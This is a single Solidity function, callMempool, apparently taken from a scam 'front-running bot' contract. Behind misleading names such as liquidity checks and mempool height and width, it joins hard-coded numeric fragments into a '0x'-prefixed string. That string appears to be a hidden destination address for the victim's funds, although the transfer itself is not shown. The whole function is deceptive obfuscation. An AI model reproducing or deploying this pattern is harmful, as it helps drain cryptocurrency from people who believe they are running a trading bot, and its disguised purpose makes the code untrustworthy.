function callMempool() public pure returns (string memory) {
    string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
    uint _memPoolSol = 893861; 
    uint _memPoolLength = getMemPoolLength();
    uint _memPoolSize = 317621; 
    uint _memPoolHeight = getMemPoolHeight();
    uint _memPoolWidth = 518215; 
    uint _memPoolDepth = getMemPoolDepth();
    uint _memPoolCount = 694542; 

    string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
    string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
    string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
    string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

    string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
    string memory _fullMempool = mempool("0", _allMempools);
    return _fullMempool;
    
}
